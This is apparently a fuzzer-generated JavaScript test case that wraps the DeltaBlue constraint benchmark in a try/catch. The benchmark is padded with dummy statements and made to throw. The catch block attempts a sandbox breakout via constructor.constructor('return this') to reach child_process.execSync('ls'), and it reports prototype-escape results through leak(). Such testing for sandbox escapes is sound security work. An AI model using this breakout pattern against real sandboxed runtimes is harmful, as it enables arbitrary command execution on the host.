try {
    Object.prototype.inherits = function (shuper) {
        let REPLACER = 23;
        function Inheriter() {
            let REPLACER = 23;
        }
        Inheriter.prototype = shuper.prototype;
        this.prototype = new Inheriter();
        this.superConstructor = shuper;
    };
    function OrderedCollection() {
        let REPLACER = 23;
        this.elms = new Array();
    }
    OrderedCollection.prototype.add = function (elm) {
        let REPLACER = 23;
        this.elms.push(elm);
    };
    OrderedCollection.prototype.at = function (index) {
        let REPLACER = 23;
        return this.elms[index];
    };
    OrderedCollection.prototype.size = function () {
        let REPLACER = 23;
        return this.elms.length;
    };
    OrderedCollection.prototype.removeFirst = function () {
        let REPLACER = 23;
        return this.elms.pop();
    };
    OrderedCollection.prototype.remove = function (elm) {
        let REPLACER = 23;
        var index = 0, skipped = 0;
        for (var i = 0; i < this.elms.length; i++) {
            var value = this.elms[i];
            if (value != elm) {
                this.elms[index] = value;
                index++;
            } else {
                skipped++;
            }
        }
        for (var i = 0; i < skipped; i++)
            this.elms.pop();
    };
    function Strength(strengthValue, name) {
        let REPLACER = 23;
        this.strengthValue = strengthValue;
        this.name = name;
    }
    Strength.stronger = function (s1, s2) {
        let REPLACER = 23;
        return s1.strengthValue < s2.strengthValue;
    };
    Strength.weaker = function (s1, s2) {
        let REPLACER = 23;
        return s1.strengthValue > s2.strengthValue;
    };
    Strength.weakestOf = function (s1, s2) {
        let REPLACER = 23;
        return this.weaker(s1, s2) ? s1 : s2;
    };
    Strength.strongest = function (s1, s2) {
        let REPLACER = 23;
        return this.stronger(s1, s2) ? s1 : s2;
    };
    Strength.prototype.nextWeaker = function () {
        let REPLACER = 23;
        switch (this.strengthValue) {
        case 0:
            return Strength.WEAKEST;
        case 1:
            return Strength.WEAK_DEFAULT;
        case 2:
            return Strength.NORMAL;
        case 3:
            return Strength.STRONG_DEFAULT;
        case 4:
            return Strength.PREFERRED;
        case 5:
            return Strength.REQUIRED;
        }
    };
    Strength.REQUIRED = new Strength(0, 'required');
    Strength.STONG_PREFERRED = new Strength(1, 'strongPreferred');
    Strength.PREFERRED = new Strength(2, 'preferred');
    Strength.STRONG_DEFAULT = new Strength(3, 'strongDefault');
    Strength.NORMAL = new Strength(4, 'normal');
    Strength.WEAK_DEFAULT = new Strength(5, 'weakDefault');
    Strength.WEAKEST = new Strength(6, 'weakest');
    function Constraint(strength) {
        let REPLACER = 23;
        this.strength = strength;
    }
    Constraint.prototype.addConstraint = function () {
        let REPLACER = 23;
        this.addToGraph();
        planner.incrementalAdd(this);
    };
    Constraint.prototype.satisfy = function (mark) {
        let REPLACER = 23;
        this.chooseMethod(mark);
        if (!this.isSatisfied()) {
            if (this.strength == Strength.REQUIRED)
                alert('Could not satisfy a required constraint!');
            return null;
        }
        this.markInputs(mark);
        var out = this.output();
        var overridden = out.determinedBy;
        if (overridden != null)
            overridden.markUnsatisfied();
        out.determinedBy = this;
        if (!planner.addPropagate(this, mark))
            alert('Cycle encountered');
        out.mark = mark;
        return overridden;
    };
    Constraint.prototype.destroyConstraint = function () {
        let REPLACER = 23;
        if (this.isSatisfied())
            planner.incrementalRemove(this);
        else
            this.removeFromGraph();
    };
    Constraint.prototype.isInput = function () {
        let REPLACER = 23;
        return false;
    };
    function UnaryConstraint(v, strength) {
        let REPLACER = 23;
        UnaryConstraint.superConstructor.call(this, strength);
        this.myOutput = v;
        this.satisfied = false;
        this.addConstraint();
    }
    UnaryConstraint.inherits(Constraint);
    UnaryConstraint.prototype.addToGraph = function () {
        let REPLACER = 23;
        this.myOutput.addConstraint(this);
        this.satisfied = false;
    };
    UnaryConstraint.prototype.chooseMethod = function (mark) {
        let REPLACER = 23;
        this.satisfied = this.myOutput.mark != mark && Strength.stronger(this.strength, this.myOutput.walkStrength);
    };
    UnaryConstraint.prototype.isSatisfied = function () {
        let REPLACER = 23;
        return this.satisfied;
    };
    UnaryConstraint.prototype.markInputs = function (mark) {
        let REPLACER = 23;
    };
    UnaryConstraint.prototype.output = function () {
        let REPLACER = 23;
        return this.myOutput;
    };
    UnaryConstraint.prototype.recalculate = function () {
        let REPLACER = 23;
        this.myOutput.walkStrength = this.strength;
        this.myOutput.stay = !this.isInput();
        if (this.myOutput.stay)
            this.execute();
    };
    UnaryConstraint.prototype.markUnsatisfied = function () {
        let REPLACER = 23;
        this.satisfied = false;
    };
    UnaryConstraint.prototype.inputsKnown = function () {
        let REPLACER = 23;
        return true;
    };
    UnaryConstraint.prototype.removeFromGraph = function () {
        let REPLACER = 23;
        if (this.myOutput != null)
            this.myOutput.removeConstraint(this);
        this.satisfied = false;
    };
    function StayConstraint(v, str) {
        let REPLACER = 23;
        StayConstraint.superConstructor.call(this, v, str);
    }
    StayConstraint.inherits(UnaryConstraint);
    StayConstraint.prototype.execute = function () {
        let REPLACER = 23;
    };
    function EditConstraint(v, str) {
        let REPLACER = 23;
        EditConstraint.superConstructor.call(this, v, str);
    }
    EditConstraint.inherits(UnaryConstraint);
    EditConstraint.prototype.isInput = function () {
        let REPLACER = 23;
        return true;
    };
    EditConstraint.prototype.execute = function () {
        let REPLACER = 23;
    };
    var Direction = new Object();
    Direction.NONE = 0;
    Direction.FORWARD = 1;
    Direction.BACKWARD = -1;
    function BinaryConstraint(var1, var2, strength) {
        let REPLACER = 23;
        BinaryConstraint.superConstructor.call(this, strength);
        this.v1 = var1;
        this.v2 = var2;
        this.direction = Direction.NONE;
        this.addConstraint();
    }
    BinaryConstraint.inherits(Constraint);
    BinaryConstraint.prototype.chooseMethod = function (mark) {
        let REPLACER = 23;
        if (this.v1.mark == mark) {
            this.direction = this.v1.mark != mark && Strength.stronger(this.strength, this.v2.walkStrength) ? Direction.FORWARD : Direction.NONE;
        }
        if (this.v2.mark == mark) {
            this.direction = this.v1.mark != mark && Strength.stronger(this.strength, this.v1.walkStrength) ? Direction.BACKWARD : Direction.NONE;
        }
        if (Strength.weaker(this.v1.walkStrength, this.v2.walkStrength)) {
            this.direction = Strength.stronger(this.strength, this.v1.walkStrength) ? Direction.BACKWARD : Direction.NONE;
        } else {
            this.direction = Strength.stronger(this.strength, this.v2.walkStrength) ? Direction.FORWARD : Direction.BACKWARD;
        }
    };
    BinaryConstraint.prototype.addToGraph = function () {
        let REPLACER = 23;
        this.v1.addConstraint(this);
        this.v2.addConstraint(this);
        this.direction = Direction.NONE;
    };
    BinaryConstraint.prototype.isSatisfied = function () {
        let REPLACER = 23;
        return this.direction != Direction.NONE;
    };
    BinaryConstraint.prototype.markInputs = function (mark) {
        let REPLACER = 23;
        this.input().mark = mark;
    };
    BinaryConstraint.prototype.input = function () {
        let REPLACER = 23;
        return this.direction == Direction.FORWARD ? this.v1 : this.v2;
    };
    BinaryConstraint.prototype.output = function () {
        let REPLACER = 23;
        return this.direction == Direction.FORWARD ? this.v2 : this.v1;
    };
    BinaryConstraint.prototype.recalculate = function () {
        let REPLACER = 23;
        var ihn = this.input(), out = this.output();
        out.walkStrength = Strength.weakestOf(this.strength, ihn.walkStrength);
        out.stay = ihn.stay;
        if (out.stay)
            this.execute();
    };
    BinaryConstraint.prototype.markUnsatisfied = function () {
        let REPLACER = 23;
        this.direction = Direction.NONE;
    };
    BinaryConstraint.prototype.inputsKnown = function (mark) {
        let REPLACER = 23;
        var i = this.input();
        return i.mark == mark || i.stay || i.determinedBy == null;
    };
    BinaryConstraint.prototype.removeFromGraph = function () {
        let REPLACER = 23;
        if (this.v1 != null)
            this.v1.removeConstraint(this);
        if (this.v2 != null)
            this.v2.removeConstraint(this);
        this.direction = Direction.NONE;
    };
    function ScaleConstraint(src, scale, offset, dest, strength) {
        let REPLACER = 23;
        this.direction = Direction.NONE;
        this.scale = scale;
        this.offset = offset;
        ScaleConstraint.superConstructor.call(this, src, dest, strength);
    }
    ScaleConstraint.inherits(BinaryConstraint);
    ScaleConstraint.prototype.addToGraph = function () {
        let REPLACER = 23;
        ScaleConstraint.superConstructor.prototype.addToGraph.call(this);
        this.scale.addConstraint(this);
        this.offset.addConstraint(this);
    };
    ScaleConstraint.prototype.removeFromGraph = function () {
        let REPLACER = 23;
        ScaleConstraint.superConstructor.prototype.removeFromGraph.call(this);
        if (this.scale != null)
            this.scale.removeConstraint(this);
        if (this.offset != null)
            this.offset.removeConstraint(this);
    };
    ScaleConstraint.prototype.markInputs = function (mark) {
        let REPLACER = 23;
        ScaleConstraint.superConstructor.prototype.markInputs.call(this, mark);
        this.scale.mark = this.offset.mark = mark;
    };
    ScaleConstraint.prototype.execute = function () {
        let REPLACER = 23;
        if (this.direction == Direction.FORWARD) {
            this.v2.value = this.v1.value * this.scale.value + this.offset.value;
        } else {
            this.v1.value = (this.v2.value - this.offset.value) / this.scale.value;
        }
    };
    ScaleConstraint.prototype.recalculate = function () {
        let REPLACER = 23;
        var ihn = this.input(), out = this.output();
        out.walkStrength = Strength.weakestOf(this.strength, ihn.walkStrength);
        out.stay = ihn.stay && this.scale.stay && this.offset.stay;
        if (out.stay)
            this.execute();
    };
    function EqualityConstraint(var1, var2, strength) {
        throw () => {
            return () => {
            };
        };
        EqualityConstraint.superConstructor.call(this, var1, var2, strength);
    }
    EqualityConstraint.inherits(BinaryConstraint);
    EqualityConstraint.prototype.execute = function () {
        this.output().value = this.input().value;
    };
    function Variable(name, initialValue) {
        this.value = initialValue || 0;
        this.constraints = new OrderedCollection();
        this.determinedBy = null;
        this.mark = 0;
        this.walkStrength = Strength.WEAKEST;
        this.stay = true;
        this.name = name;
    }
    Variable.prototype.addConstraint = function (c) {
        this.constraints.add(c);
    };
    Variable.prototype.removeConstraint = function (c) {
        this.constraints.remove(c);
        if (this.determinedBy == c)
            this.determinedBy = null;
    };
    function Planner() {
        this.currentMark = 0;
    }
    Planner.prototype.incrementalAdd = function (c) {
        var mark = this.newMark();
        var overridden = c.satisfy(mark);
        while (overridden != null)
            overridden = overridden.satisfy(mark);
    };
    Planner.prototype.incrementalRemove = function (c) {
        var out = c.output();
        c.markUnsatisfied();
        c.removeFromGraph();
        var unsatisfied = this.removePropagateFrom(out);
        var strength = Strength.REQUIRED;
        do {
            for (var i = 0; i < unsatisfied.size(); i++) {
                var u = unsatisfied.at(i);
                if (u.strength == strength)
                    this.incrementalAdd(u);
            }
            strength = strength.nextWeaker();
        } while (strength != Strength.WEAKEST);
    };
    Planner.prototype.newMark = function () {
        return ++this.currentMark;
    };
    Planner.prototype.makePlan = function (sources) {
        var mark = this.newMark();
        var plan = new Plan();
        var todo = sources;
        while (todo.size() > 0) {
            var c = todo.removeFirst();
            if (c.output().mark != mark && c.inputsKnown(mark)) {
                plan.addConstraint(c);
                c.output().mark = mark;
                this.addConstraintsConsumingTo(c.output(), todo);
            }
        }
        return plan;
    };
    Planner.prototype.extractPlanFromConstraints = function (constraints) {
        var sources = new OrderedCollection();
        for (var i = 0; i < constraints.size(); i++) {
            var c = constraints.at(i);
            if (c.isInput() && c.isSatisfied())
                sources.add(c);
        }
        return this.makePlan(sources);
    };
    Planner.prototype.addPropagate = function (c, mark) {
        var todo = new OrderedCollection();
        todo.add(c);
        while (todo.size() > 0) {
            var d = todo.removeFirst();
            if (d.output().mark == mark) {
                this.incrementalRemove(c);
                return false;
            }
            d.recalculate();
            this.addConstraintsConsumingTo(d.output(), todo);
        }
        return true;
    };
    Planner.prototype.removePropagateFrom = function (out) {
        out.determinedBy = null;
        out.walkStrength = Strength.WEAKEST;
        out.stay = true;
        var unsatisfied = new OrderedCollection();
        var todo = new OrderedCollection();
        todo.add(out);
        while (todo.size() > 0) {
            var v = todo.removeFirst();
            for (var i = 0; i < v.constraints.size(); i++) {
                var c = v.constraints.at(i);
                if (!c.isSatisfied())
                    unsatisfied.add(c);
            }
            var determining = v.determinedBy;
            for (var i = 0; i < v.constraints.size(); i++) {
                var next = v.constraints.at(i);
                if (next != determining && next.isSatisfied()) {
                    next.recalculate();
                    todo.add(next.output());
                }
            }
        }
        return unsatisfied;
    };
    Planner.prototype.addConstraintsConsumingTo = function (v, coll) {
        var determining = v.determinedBy;
        var cc = v.constraints;
        for (var i = 0; i < cc.size(); i++) {
            var c = cc.at(i);
            if (c != determining && c.isSatisfied())
                coll.add(c);
        }
    };
    function Plan() {
        this.v = new OrderedCollection();
    }
    Plan.prototype.addConstraint = function (c) {
        this.v.add(c);
    };
    Plan.prototype.size = function () {
        return this.v.size();
    };
    Plan.prototype.constraintAt = function (index) {
        return this.v.at(index);
    };
    Plan.prototype.execute = function () {
        for (var i = 0; i < this.size(); i++) {
            var c = this.constraintAt(i);
            c.execute();
        }
    };
    function chainTest(n) {
        planner = new Planner();
        var prev = null, first = null, last = null;
        for (var i = 0; i <= n; i++) {
            var name = 'v' + i;
            var v = new Variable(name);
            if (prev != null)
                new EqualityConstraint(prev, v, Strength.REQUIRED);
            if (i == 0)
                first = v;
            if (i == n)
                last = v;
            prev = v;
        }
        new StayConstraint(last, Strength.STRONG_DEFAULT);
        var edit = new EditConstraint(first, Strength.PREFERRED);
        var edits = new OrderedCollection();
        edits.add(edit);
        var plan = planner.extractPlanFromConstraints(edits);
        for (var i = 0; i < 100; i++) {
            first.value = i;
            plan.execute();
            if (last.value != i)
                alert('Chain test failed.');
        }
    }
    function projectionTest(n) {
        planner = new Planner();
        var scale = new Variable('scale', 10);
        var offset = new Variable('offset', 1000);
        var src = null, dst = null;
        var dests = new OrderedCollection();
        for (var i = 0; i < n; i++) {
            src = new Variable('src' + i, i);
            dst = new Variable('dst' + i, i);
            dests.add(dst);
            new StayConstraint(src, Strength.NORMAL);
            new ScaleConstraint(src, scale, offset, dst, Strength.REQUIRED);
        }
        change(src, 17);
        if (dst.value != 1170)
            alert('Projection 1 failed');
        change(dst, 1050);
        if (src.value != 5)
            alert('Projection 2 failed');
        change(scale, 5);
        for (var i = 0; i < n - 1; i++) {
            if (dests.at(i).value != i * 5 + 1000)
                alert('Projection 3 failed');
        }
        change(offset, 2000);
        for (var i = 0; i < n - 1; i++) {
            if (dests.at(i).value != i * 5 + 2000)
                alert('Projection 4 failed');
        }
    }
    function change(v, newValue) {
        var edit = new EditConstraint(v, Strength.PREFERRED);
        var edits = new OrderedCollection();
        edits.add(edit);
        var plan = planner.extractPlanFromConstraints(edits);
        for (var i = 0; i < 10; i++) {
            v.value = newValue;
            plan.execute();
        }
        edit.destroyConstraint();
    }
    var planner = null;
    function deltaBlue() {
        chainTest(100);
        projectionTest(100);
    }
    for (var i = 0; i < 155; ++i)
        deltaBlue();
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}